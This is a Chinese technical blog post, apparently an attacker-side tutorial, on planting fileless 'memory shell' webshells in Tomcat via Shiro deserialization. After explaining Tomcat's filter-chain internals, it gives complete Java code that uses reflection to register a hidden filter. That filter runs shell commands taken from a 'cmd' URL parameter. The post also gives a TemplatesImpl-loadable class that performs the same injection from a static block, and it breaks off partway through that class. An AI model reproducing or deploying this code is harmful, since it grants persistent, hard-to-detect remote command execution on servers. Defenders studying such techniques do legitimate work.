    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="shiro-内存马"><a href="#shiro-内存马" class="headerlink" title="shiro 内存马"></a>shiro 内存马</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习内存马可以先了解一下tomcat的机制：<a href="https://blog.csdn.net/sunyunjie361/article/details/58588033">Tomcat的概念及启动原理浅析_tomcat会调用无参构造-CSDN博客</a></p><p>关于内存马最初的样子就是利用文件上传 jsp 脚本，在脚本里实现动态注册一个 listener、filter 或者 servlet 这样的 http 处理组件，我们可以在代码里实现注册成功后删除这个 jsp 脚本，从而做到无文件的内存马。通过 shiro 打内存马，其实本质上跟 jsp 是一样的，都是通过动态的注册一个请求处理组件。不同的就是我们需要利用像 TemplatesImpl 这样具有类加载、实例化能力的反序列链或者其他具有类加载、实例化能力的漏洞，在执行静态代码块时，动态创建而已。</p><p>不过仍有一些不同的挑战，jsp 脚本会被 tomcat 编译为 servlet 脚本，我们可以直接访问 request 和 response 对象。而通过反序列化打入的内存马，我们需要寻找全局可用的 request 和 response 对象，才可以实现回显的内存马</p><p>我们先来看普通的内存马是如何产生的</p><p>三大组件调用流程<br><img src="https://gitee.com/ling-x5/img/raw/master/image-20250220093049720.png" alt="image-20250220093049720"></p><p>其实内存马主要就是依赖于 <code>javax.servlet.ServletContext</code> 的动态进行注册注册机制</p><p>在 Web 容器初始化的时候（即建立 ServletContext 对象的时候）进行动态注册。可以看到 ServletContext 提供了 add &#x2F;create 方法来实现动态注册的功能。</p><p>ServletContext 提供的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ServletRegistration.Dynamic <span class="hljs-title function_">addServlet</span><span class="hljs-params">(String servletName, String className)</span>;<br><span class="hljs-keyword">public</span> ServletRegistration.Dynamic <span class="hljs-title function_">addServlet</span><span class="hljs-params">(String servletName, Servlet servlet)</span>;<br><span class="hljs-keyword">public</span> ServletRegistration.Dynamic <span class="hljs-title function_">addServlet</span><span class="hljs-params">(String servletName, Class &lt;? extends Servlet&gt; servletClass)</span>;<br><br><span class="hljs-keyword">public</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName, String className)</span>;<br><span class="hljs-keyword">public</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName, Filter filter)</span>;<br><span class="hljs-keyword">public</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName, Class &lt;? extends Filter&gt; filterClass)</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addListener</span><span class="hljs-params">(String className)</span>;<br><span class="hljs-keyword">public</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventListener</span>&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">addListener</span><span class="hljs-params">(T t)</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addListener</span><span class="hljs-params">(Class &lt;? extends EventListener&gt; listenerClass)</span>;<br></code></pre></td></tr></table></figure><p>这些接口就给内存马的注入提供了可能</p><h2 id="Filter-内存马"><a href="#Filter-内存马" class="headerlink" title="Filter 内存马"></a>Filter 内存马</h2><p>其实本质就是利用 context 动态注册一个 Filter 过滤器，处理 http 请求，再 doFilter 方法中实现命令执行的逻辑</p><p>可以转到  <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 看一下 addFilter 的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName, String filterClass, Filter filter)</span><br>    <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br><br>    <span class="hljs-comment">// 检查过滤器名称是否为 null 或空字符串，如果是则抛出异常</span><br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br><br>    <span class="hljs-comment">// TODO Spec breaking enhancement to ignore this restriction</span><br>    <span class="hljs-comment">// 检查上下文状态是否为 STARTING_PREP，如果不是则抛出异常</span><br>    checkState(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>);<br><br>    <span class="hljs-comment">// 尝试从上下文中查找指定名称的过滤器定义</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> context.findFilterDef(filterName);<br><br>    <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果过滤器定义不存在，则创建一个新的过滤器定义</span><br>        filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        <span class="hljs-comment">// 设置过滤器名称</span><br>        filterDef.setFilterName(filterName);<br>        <span class="hljs-comment">// 将新的过滤器定义添加到StandardContext </span><br>        context.addFilterDef(filterDef);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果过滤器定义已经存在，并且名称和类名都不为 null，则返回 null</span><br>        <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp; filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有提供过滤器实例，则使用类名设置过滤器定义</span><br>    <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>        filterDef.setFilterClass(filterClass);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果提供了过滤器实例，则使用实例的类名设置过滤器定义，并设置过滤器实例</span><br>        filterDef.setFilterClass(filter.getClass().getName());<br>        filterDef.setFilter(filter);<br>    &#125;<br><br>    <span class="hljs-comment">// 创建并返回一个新的应用过滤器注册对象</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, context);<br>&#125;<br></code></pre></td></tr></table></figure><p>当然直接通过这个方法是无法创建成功的，因为它只是返回了 <code>ApplicationFilterRegistration</code> 并没有把 filter 添加到 filterChain 中，而且它具有一个状态检测的限制 <code>applicationContext.addFilter.ise</code> 这个表示 tomcat 正在启动过程中。</p><p>那我们来看看 filterChain 是如何创建的，org.apache.catalina.core.ApplicationFilterFactory#createFilterChain 这个方法动态生成每次的 filterChain，我们如果可以让这个方法每次都能获取到我们 <code>恶意的filter</code> 不就可以完成 filter 的注册了吗，看一下这个 filterChain 的生成逻辑</p><p>代码有点长，保留了主要部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 从StandardContext 获取filterMaps 集合</span><br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br>FilterMap filterMaps[] = context.findFilterMaps();<br><br><span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br><span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>    <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());<br>    <span class="hljs-keyword">if</span> (filterConfig == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// FIXME - log configuration problem</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    filterChain.addFilter(filterConfig);<br>&#125;<br><br><span class="hljs-comment">// Return the completed filter chain</span><br><span class="hljs-keyword">return</span> filterChain;<br></code></pre></td></tr></table></figure><p>再 filterConfig 中有 filter 和 filterDef 定义</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250423140403396.png" alt="image-20250423140403396"></p><p>看到都是从 StandardContext 这个上下文获取到对应的 filter 然后 filterChain 会做相应的匹配，获取到 filterConfig 再把 filter 添加到 filterChain，后续就返回 filterChain 在 StandardWrapperValve#Invoke 中执行 doFilter 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250423141145209.png" alt="image-20250423141145209"></p><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p><p>知道上述流程后，我们已经知道 filter 注册需要哪些东西了，利用反射创建出来，放到 StandardContext 中就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.servlet;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-meta">@WebServlet(&quot;/addFilter&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">addFilterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">addFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;&#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">// 操作系统检测逻辑</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">charset</span> <span class="hljs-operator">=</span> os.contains(<span class="hljs-string">&quot;win&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span> : <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> os.contains(<span class="hljs-string">&quot;win&quot;</span>) ? <span class="hljs-string">&quot;cmd /c&quot;</span> : <span class="hljs-string">&quot;/bin/sh -c&quot;</span>;<br><br>            <span class="hljs-comment">// 命令执行处理流程</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            Runtime.getRuntime().exec(shell + cmd);<br>            <span class="hljs-comment">// 继续过滤链，将请求传递给 Servlet</span><br>            filterChain.doFilter(req, res);<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取StandardContext上下文</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> getServletContext();<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            * 循环是因为 req.getServletContext() 返回的是 ApplicationContextFacade，</span><br><span class="hljs-comment">            * 并且它的 context 指向 ApplicationContext，</span><br><span class="hljs-comment">            * 再进一步取 context 就能到达 StandardContext</span><br><span class="hljs-comment">            * 但是由于环境的不确定性，我们循环获取StandardContext</span><br><span class="hljs-comment">            * */</span><br>            <span class="hljs-keyword">while</span> (standardContext == <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>                context.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> context.get(servletContext);<br>                <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> ServletContext)&#123;<br>                    servletContext = (ServletContext)obj;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span>  StandardContext) &#123;<br>                    standardContext = (StandardContext)obj;<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 创建FilterDef对象</span><br>            <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>            filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">addFilter</span>());<br>            filterDef.setFilterName(<span class="hljs-string">&quot;addFilter&quot;</span>);<br>            filterDef.setFilterClass(addFilter.class.getName());<br>            <span class="hljs-comment">// 创建 ApplicationFilterConfig 对象</span><br>            Constructor&lt;ApplicationFilterConfig&gt; filterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>            filterConfigConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> filterConfigConstructor.newInstance(standardContext, filterDef);<br>            <span class="hljs-comment">// 创建 FilterMap 对象</span><br>            <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>            filterMap.addURLPattern(<span class="hljs-string">&quot;/lingx5&quot;</span>);<br>            filterMap.setFilterName(<span class="hljs-string">&quot;addFilter&quot;</span>);<br>            filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>            <span class="hljs-comment">// 将ApplicationFilterConfig对象添加到StandardContext中</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            filterConfigs.setAccessible(<span class="hljs-literal">true</span>);<br>            HashMap&lt;String, ApplicationFilterConfig&gt; map = (HashMap&lt;String, ApplicationFilterConfig&gt;) filterConfigs.get(standardContext);<br>            map.put(<span class="hljs-string">&quot;addFilter&quot;</span>, config);<br>            <span class="hljs-comment">// 将FilterMap添加到StandardContext中</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">filterMaps</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterMaps&quot;</span>);<br>            filterMaps.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> filterMaps.get(standardContext);<br>            Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;</span>);<br>            <span class="hljs-comment">// addBefore 将 filter 放在第一位</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">addBefore</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;addBefore&quot;</span>, FilterMap.class);<br>            addBefore.setAccessible(<span class="hljs-literal">true</span>);<br>            addBefore.invoke(o, filterMap);<br>            res.getWriter().println(<span class="hljs-string">&quot;addFilter success&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试一下，我们添加的 url 路径就是 servlet 的路径，访问 <code>/addFilter</code> 执行 sevice 方法，添加内存马。</p><p>然后访问我们给 filter 添加的映射路径 <code>/lingx5</code> 加上参数 cmd</p><p>首次访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/memoshell/</span>lingx5?cmd=calc<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250423144528762.png" alt="image-20250423144528762"></p><p>没有任何反应</p><p>我们访问 <code>/addFilter</code></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250423144028661.png" alt="image-20250423144028661"></p><p>添加成功，再次访问 <code>/lingx5</code></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250423144609673.png" alt="image-20250423144609673"></p><p>弹出来计算机</p><blockquote><p>因为是 filter 内存马，doFilter 传递的参数是 ServletRequest 和 ServletResponse 不能直接实现会先。当然还是有师傅研究出来了可以回显的 filter 内存马</p></blockquote><h2 id="反序列化打内存马"><a href="#反序列化打内存马" class="headerlink" title="反序列化打内存马"></a>反序列化打内存马</h2><p>很容易看出来，上述内存马还得借助文件上传的漏洞，访问 <code>/addFilter</code> 执行 service 方法，才能够完成。那我们怎么利用反序列化这样的方式，实现真正的无文件创建内存马呢？</p><p>答案其实也是很简单的，还记得反序列化链里有 templatesImpl 这个为终点的利用链吗？它不就有实现类加载执行静态代码块的能力，我们把内存马的注入动作放到静态代码块里不就可以了</p><p>构造一下，也比较简单（先不考虑回显的问题）</p><p>用 templates 实现类加载，我们的类要继承 AbstractTranslet </p><p>创建一个 addFilter 类 获取 context 和 在 service 方法 略有区别，具体可以看这篇文章 <a href="https://xz.aliyun.com/news/9369">Java 内存马：一种 Tomcat 全版本获取 StandardContext 的新方法-先知社区</a> 对获取 context 做了总结</p><h3 id="shiro-Filter"><a href="#shiro-Filter" class="headerlink" title="shiro-Filter"></a>shiro-Filter</h3><p>我这里是 tomcat8.5.27 ，在 8.5.x 的高版本也不适用 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-meta">@WebFilter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">addFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">javax</span>.servlet.Filter  &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取StandardContext上下文</span><br>            <span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span><br>                (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>            <span class="hljs-comment">// 创建FilterDef对象</span><br>            <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>            filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">addFilter</span>());<br>            filterDef.setFilterName(<span class="hljs-string">&quot;addFilter&quot;</span>);<br>            filterDef.setFilterClass(addFilter.class.getName());<br>            <span class="hljs-comment">// 创建 ApplicationFilterConfig 对象</span><br>            Constructor&lt;ApplicationFilterConfig&gt; filterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>            filterConfigConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> filterConfigConstructor.newInstance(standardContext, filterDef);<br>            <span class="hljs-comment">// 创建 FilterMap 对象</span><br>            <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>            filterMap.addURLPattern(<span class="hljs-string">&quot;/lingx5&quot;</span>);<br>            filterMap.setFilterName(<span class="hljs-string">&quot;addFilter&quot;</span>);<br>            filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>            <span class="hljs-comment">// 将ApplicationFilterConfig对象添加到StandardContext中</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            filterConfigs.setAccessible(<span class="hljs-literal">true</span>);<br>            HashMap&lt;String, ApplicationFilterConfig&gt; map = (HashMap&lt;String, ApplicationFilterConfig&gt;) filterConfigs.get(standardContext);<br>            map.put(<span class="hljs-string">&quot;addFilter&quot;</span>, 